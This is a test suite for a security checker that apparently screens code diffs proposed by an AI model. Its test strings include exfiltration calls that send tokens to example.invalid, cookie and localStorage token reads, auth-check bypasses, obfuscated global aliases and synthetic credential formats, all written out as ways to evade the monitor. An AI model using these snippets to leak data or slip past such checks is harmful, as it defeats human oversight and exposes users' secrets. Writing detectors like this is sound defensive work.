import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { MODEL_ALLOWED_PATH } from '../aieo/lib/model-provider.mjs';
import { inspectModelDiff } from './aieo-model-security.mjs';

const hash = (value) => createHash('sha256').update(value).digest('hex');
const original = 'const items = 1;\n';
const actual = 'const items = 2;\n';
const report = { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) };
const diff = '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n';
const input = { original, actual, changedPaths: [MODEL_ALLOWED_PATH], diff, report };

test('independent security accepts one exact clean change', () => {
  assert.equal(inspectModelDiff(input).status, 'passed');
});
test('security blocks changed-file scope and hash tampering', () => {
  assert.equal(inspectModelDiff({ ...input, changedPaths: ['supabase/config.toml'] }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, changedPaths: [MODEL_ALLOWED_PATH, 'package.json'] }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, report: { ...report, proposedHash: 'wrong' } }).status, 'failed');
});
test('security blocks suspicious newly introduced calls and credentials', () => {
  assert.equal(inspectModelDiff({ ...input, diff: '+fetch("https://example.invalid")' }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, diff: '+ghp_' + 'a'.repeat(30) }).status, 'failed');
});
test('security blocks no-op and massive diffs', () => {
  assert.equal(inspectModelDiff({ ...input, actual: original }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, diff: '+safe\n'.repeat(25) }).status, 'failed');
});

test('security rejects browser exfiltration primitives and modern credentials', () => {
  for (const addition of [
    '+const raw = document.cookie;',
    '+localStorage.getItem("token");',
    '+new WebSocket("wss://example.invalid");',
    '+<div dangerouslySetInnerHTML={{ __html: message }} />;',
    '+import { execSync } from "child_process";',
    '+sk-or-v1-' + 'a'.repeat(40),
    '+github_pat_' + 'b'.repeat(40),
    '+Bearer ' + 'c'.repeat(36)
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});

test('security rejects browser side-channel exfiltration and navigation additions', () => {
  for (const addition of [
    '+window.open("https://example.invalid/?data=" + token);',
    '+navigator["sendBeacon"]("https://example.invalid", body);',
    '+const pixel = new Image();',
    '+location.assign("https://example.invalid");',
    '+window.location.href = "https://example.invalid";',
    '+document.createElement("iframe");',
    '+globalThis["fetch"]("https://example.invalid");'
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});

test('security rejects newly added outbound markup and CSS, including multiline JSX', () => {
  for (const addition of [
    '+<img src={unsafeUrl} />',
    '+<a href={unsafeUrl}>Open</a>',
    '+<form action={unsafeUrl}>Send</form>',
    '+<iframe\n+ src={unsafeUrl} />',
    '+const style = { backgroundImage: \`url(https://example.invalid/\${token})\` };'
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});

test('security refuses removal of existing feedback authentication and ownership guards', () => {
  const protectedSource = [
    'const auth = await supabase.auth.getUser();',
    'if (!auth.user) return;',
    'const record = { created_by: auth.user.id };',
    'await supabase.from("feedback").insert(record);',
    ''
  ].join('\n');
  const variants = [
    protectedSource.replace('if (!auth.user)', 'if (true)'),
    protectedSource.replace('created_by: auth.user.id', 'created_by: null'),
    protectedSource.replace('await supabase.auth.getUser()', 'Promise.resolve(null)')
  ];
  for (const current of variants) {
    const evidence = {
      status: 'proposed', sourceHash: hash(protectedSource), proposedHash: hash(current)
    };
    const result = inspectModelDiff({
      original: protectedSource, actual: current, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1 @@\n+const safe = 1;\n', report: evidence
    });
    assert.equal(result.status, 'failed');
    assert.ok(result.findings.some((value) => value.includes('authentication or ownership')));
  }
});

test('security freezes submit handler against comment-only auth bypass while allowing UI text edits', () => {
  const base = [
    'export default function FeedbackWidget() {',
    '  async function submit(event: FormEvent<HTMLFormElement>) {',
    '    const { data: auth } = await supabase.auth.getUser();',
    '    if (!auth.user) { return; }',
    '    await supabase.from("feedback").insert({ created_by: auth.user.id });',
    '  }',
    '  return <>',
    '    <form onSubmit={submit}><span>Old label</span></form>',
    '  </>;',
    '}',
    ''
  ].join(String.fromCharCode(10));
  const assess = (actual, diff) => inspectModelDiff({
    original: base, actual, changedPaths: [MODEL_ALLOWED_PATH], diff,
    report: { status: 'proposed', sourceHash: hash(base), proposedHash: hash(actual) }
  });
  const safe = base.replace('Old label', 'New label');
  assert.equal(assess(safe, '+    <form onSubmit={submit}><span>New label</span></form>').status, 'passed');
  // The old substring-only guard accepted commented-out auth checks.
  const commented = base.replace('    if (!auth.user)', '    // if (!auth.user)');
  const commentResult = assess(commented, '+    // if (!auth.user) { return; }');
  assert.equal(commentResult.status, 'failed');
  assert.ok(commentResult.findings.some((finding) => finding.includes('submit handler')));
  const reassigned = base.replace('<form onSubmit={submit}>', '<form onSubmit={() => {}}>');
  assert.equal(assess(reassigned, '+    <form onSubmit={() => {}}><span>Old label</span></form>').status, 'failed');
  const blockComment = base.replace('    if (!auth.user)', '    /* if (!auth.user)');
  assert.equal(assess(blockComment, '+    /* if (!auth.user) { return; }').status, 'failed');
});

test('independent security rejects concealed long or quote-terminated JSX outbound attributes', () => {
  const attempts = [
    '<img ' + ' '.repeat(380) + ' src={unsafeUrl} />',
    '<img title=">" src={unsafeUrl} />',
    '<form title=">" ' + ' '.repeat(375) + ' action={unsafeUrl}>Send</form>'
  ];
  for (const addition of attempts) {
    const result = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(result.status, 'failed',
      'independent security must reject attribute hidden past spacing or a quoted >');
    assert.ok(result.findings.includes('Potentially unsafe new code'));
  }
});


test('independent security rejects alternate JSX network sinks, spread props and image-set', () => {
  const additions = [
    '<input type="image" src={unsafeUrl} />',
    '<button formAction={unsafeUrl}>Send</button>',
    '<svg><image href={unsafeUrl} /></svg>',
    '<svg><use xlinkHref={unsafeUrl} /></svg>',
    '<meta httpEquiv="refresh" content={unsafeUrl} />',
    '<base href={unsafeUrl} />',
    '<video poster={unsafeUrl} />',
    '<track src={unsafeUrl} />',
    '<link imageSrcSet={unsafeUrl} />',
    '<img {...remoteProps} />',
    '<img {...{ src: unsafeUrl }} />',
    '<img\n+  {...remoteProps}\n+/>',
    'const style = { background: image-set("https://example.invalid/track" 1x) };',
    'const style = { background: -webkit-image-set("https://example.invalid/track" 1x) };'
  ];
  for (const addition of additions) {
    const result = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(result.status, 'failed', addition);
    assert.ok(result.findings.includes('Potentially unsafe new code'));
  }
  assert.equal(inspectModelDiff({ ...input, diff: '+<img alt="decorative" />' }).status, 'passed');
});

test('independent Security rejects direct and computed browser location redirects', () => {
  const redirects = [
    'window.location = unsafeUrl;',
    'globalThis["location"] = unsafeUrl;',
    'self?.location = unsafeUrl;',
    'parent.location = unsafeUrl;',
    'document["location"].href = unsafeUrl;',
    'location = unsafeUrl;',
    'window?.["location"] = unsafeUrl;'
  ];
  for (const addition of redirects) {
    const result = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(result.status, 'failed', addition);
    assert.ok(result.findings.includes('Potentially unsafe new code'));
  }
  assert.equal(inspectModelDiff({ ...input, diff: '+const locationLabel = "Current status";' }).status, 'passed');
});


test('independent Security blocks optional browser network calls and EventSource', () => {
  const attempts = [
    "fetch?.(\"https://example.invalid/?data=\" + token);",
    "window?.open?.(\"https://example.invalid/?data=\" + token);",
    "globalThis?.[\"fetch\"]?.(\"https://example.invalid/?data=\" + token);",
    "navigator?.sendBeacon?.(\"https://example.invalid\", body);",
    "navigator?.[\"sendBeacon\"]?.(\"https://example.invalid\", body);",
    "self?.WebSocket?.(\"wss://example.invalid\");",
    "new EventSource(\"https://example.invalid/stream\");",
    "document?.createElement?.(\"iframe\");"
];
  for (const addition of attempts) {
    const result = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(result.status, 'failed', addition);
    assert.ok(result.findings.includes('Potentially unsafe new code'));
  }
  assert.equal(inspectModelDiff({ ...input, diff: '+const networkStatusLabel = "Ready";' }).status, 'passed');
});

test('independent Security blocks indirect network calls and Reflect invocation', () => {
  const attempts = [
    'fetch.call(globalThis, "https://example.invalid/?data=" + token);',
    'navigator.sendBeacon.apply(navigator, ["https://example.invalid", data]);',
    'globalThis["fetch"]["call"](globalThis, unsafeUrl);',
    'Reflect.apply(fetch, globalThis, [unsafeUrl]);',
    'Reflect.construct(WebSocket, ["wss://example.invalid"]);',
    'new WebSocket("wss://example.invalid");',
    'importScripts("https://example.invalid/remote.js");'
  ];
  for (const addition of attempts) {
    const verdict = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(verdict.status, 'failed', addition);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), addition);
  }
  assert.equal(inspectModelDiff({ ...input, diff: '+const label = "Safe local status";' }).status, 'passed');
});

test('independent Security rejects aliased transports and dynamic-code invokers', () => {
  const attempts = [
    "const sender = fetch; sender(unsafeUrl);",
    "const sender = globalThis[\"fetch\"]; sender(unsafeUrl);",
    "const { sendBeacon: beacon } = navigator; beacon(unsafeUrl, body);",
    "const SocketCtor = WebSocket; new SocketCtor(unsafeUrl);",
    "const PixelCtor = Image; new PixelCtor().src = unsafeUrl;",
    "const opener = globalThis[\"open\"]; opener(unsafeUrl);",
    "const maker = document.createElement; maker(\"img\").src = unsafeUrl;",
    "const remote = Reflect[\"apply\"](fetch, globalThis, [unsafeUrl]);",
    "const WorkerCtor = SharedWorker; new WorkerCtor(unsafeUrl);",
    "const load = importScripts; load(unsafeUrl);",
    "const remoteModule = import(unsafeUrl);",
    "const run = eval; run(unsafeCode);",
    "const codeConstructor = Function; codeConstructor(unsafeCode)();"
  ];
  for (const addition of attempts) {
    const verdict = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(verdict.status, 'failed', addition);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), addition);
  }
  assert.equal(inspectModelDiff({ ...input, diff: '+' + "  const fetchStatus = \"local\"; const imageLabel = \"Decorative\";" }).status, 'passed');
});

test('independent Security blocks dynamically resolved browser globals', () => {
  const attempts = [
    "const sender = globalThis['fe' + 'tch']; sender(unsafeUrl);",
    "const opener = window?.['op' + 'en']; opener(unsafeUrl);",
    "navigator['send' + 'Beacon'](unsafeUrl, data);",
    "document['create' + 'Element']('img').src = unsafeUrl;",
    "self['loc' + 'ation'] = unsafeUrl;",
    "const SocketCtor = Reflect.get(globalThis, 'Web' + 'Socket'); new SocketCtor(unsafeUrl);"
];
  for (const addition of attempts) {
    const verdict = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(verdict.status, 'failed', addition);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), addition);
  }
  assert.equal(inspectModelDiff({ ...input,
    diff: '+const localStatus = "Ready";' }).status, 'passed');
});

test('independent Security rejects aliases of ambient globals and computed sinks', () => {
  const attempts = [
    "const root = globalThis; root['fe' + 'tch'](unsafeUrl);",
    "const root = window; root['loc' + 'ation'] = unsafeUrl;",
    "const host = navigator; host['send' + 'Beacon'](unsafeUrl, data);",
    "const scope = self; scope['op' + 'en'](unsafeUrl);",
    "const scope = global; scope['fe' + 'tch'](unsafeUrl);",
    "const dest = location; dest['ass' + 'ign'](unsafeUrl);",
    "const frameSet = frames; frameSet[0]['loc' + 'ation'] = unsafeUrl;",
    "const scope = this; scope['fe' + 'tch'](unsafeUrl);"
  ];
  for (const addition of attempts) {
    const verdict = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(verdict.status, 'failed', addition);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), addition);
  }
  for (const addition of [
    'const windowStatus = "Ready";',
    'const locationLabel = "Current status";'
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: '+' + addition }).status, 'passed', addition);
  }
});

test('independent Security refuses AWS temporary IDs and cloud account key material', () => {
  const cloudMarkers = [
    'ASIA' + 'Z'.repeat(16),
    'AWS_SECRET_ACCESS_KEY = "' + 's'.repeat(40) + '"',
    'AccountKey="' + 'A'.repeat(44) + '"'
  ];
  for (const marker of cloudMarkers) {
    const verdict = inspectModelDiff({ ...input, diff: '+const synthetic = ' + marker + ';' });
    assert.equal(verdict.status, 'failed', 'Security must reject ' + marker.slice(0, 8));
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
});

test('independent Security refuses signed URL and SaaS token disclosure', () => {
  const markers = [
    '?X-Amz-Signature=' + 'a'.repeat(64),
    '&X-Amz-Credential=' + 'X'.repeat(40),
    '?sv=2023-11-03&sig=' + 'A'.repeat(44),
    'xoxb-' + '1'.repeat(18) + '-' + 'a'.repeat(16),
    'AIza' + 'a'.repeat(35)
  ];
  for (const marker of markers) {
    const result = inspectModelDiff({ ...input, diff: '+const sensitive = "' + marker + '";' });
    assert.equal(result.status, 'failed', marker);
    assert.ok(result.findings.includes('Potentially unsafe new code'), marker);
  }
  assert.equal(inspectModelDiff({
    ...input, diff: '+const signatureStatus = "Pending";'
  }).status, 'passed');
});


test('independent Security rejects unprefixed JWT-shaped credentials', () => {
  // Synthetic bytes, not a functional bearer token.
  const jwt = 'eyJ' + 'A'.repeat(18) + '.' + 'eyJ' + 'B'.repeat(24) + '.' + 'C'.repeat(32);
  const blocked = inspectModelDiff({ ...input, diff: '+const value = "' + jwt + '";' });
  assert.equal(blocked.status, 'failed');
  assert.ok(blocked.findings.includes('Potentially unsafe new code'));
  assert.equal(inspectModelDiff({
    ...input, diff: '+const status = "Authenticated locally";'
  }).status, 'passed');
});


test('independent Security rejects encoded JavaScript globals and call targets', () => {
  const attempts = [
    String.raw`const sender = \u0066etch; sender(unsafeUrl);`,
    String.raw`const root = \u0067lobalThis; root['fe' + 'tch'](unsafeUrl);`,
    String.raw`const root = \u{67}lobalThis; root['fe' + 'tch'](unsafeUrl);`,
    String.raw`const sender = \u0067lobalThis['\x66etch']; sender(unsafeUrl);`
  ];
  for (const addition of attempts) {
    const verdict = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(verdict.status, 'failed', addition);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), addition);
  }
  assert.equal(inspectModelDiff({
    ...input, diff: '+const label = "Locally rendered status";'
  }).status, 'passed');
});


test('independent Security rejects added unquoted key assignments', () => {
  const markers = [
    'AWS_SECRET_ACCESS_KEY=' + 'x'.repeat(40),
    'AccountKey=' + 'A'.repeat(48) + '==',
    'client_secret:' + 'b'.repeat(36),
    'api_key=' + 'c'.repeat(30),
    'password=' + 'd'.repeat(25),
    'service_role=' + 'e'.repeat(32)
  ];
  for (const marker of markers) {
    const result = inspectModelDiff({
      ...input, diff: '+const field = "' + marker + '";'
    });
    assert.equal(result.status, 'failed', marker);
    assert.ok(result.findings.includes('Potentially unsafe new code'), marker);
  }
  assert.equal(inspectModelDiff({ ...input, diff: '+const displayLabel = "Ready";' }).status, 'passed');
});

test('independent Security rejects constructor and prototype reflection', () => {
  const additions = [
    'const execute = [].filter.constructor("return 42")();',
    'const execute = ({})["constructor"]["constructor"]("return 42")();',
    'const proto = obj.__proto__;',
    'const proto = Object.getPrototypeOf(obj);',
    'Object.setPrototypeOf(obj, other);',
    'Object.defineProperty(obj, "code", { value: 1 });'
  ];
  for (const addition of additions) {
    const verdict = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(verdict.status, 'failed', addition);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), addition);
  }
  assert.equal(inspectModelDiff({ ...input,
    diff: '+const label = "Local UI status";' }).status, 'passed');
});

test('independent Security blocks invisible Unicode in actual candidate additions', () => {
  const assess = (candidate) => inspectModelDiff({
    original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '@@ -1 +1 @@\n-const items = 1;\n+' + candidate,
    report: { status: 'proposed', sourceHash: hash(original),
      proposedHash: hash(candidate) }
  });
  // This is an independent review of the committed diff, not a validation of
  // the earlier model response. An altered candidate must fail closed too.
  for (const invisible of ['\u200B', '\u200D', '\u200E', '\u2060', '\uFEFF']) {
    const candidate = 'const items = 2; // display' + invisible + 'status;\n';
    const verdict = assess(candidate);
    assert.equal(verdict.status, 'failed', 'invisible candidate must be rejected');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  assert.equal(assess('const items = 2; // حالة العرض\n').status, 'passed',
    'normal Arabic display text remains permissible');
});
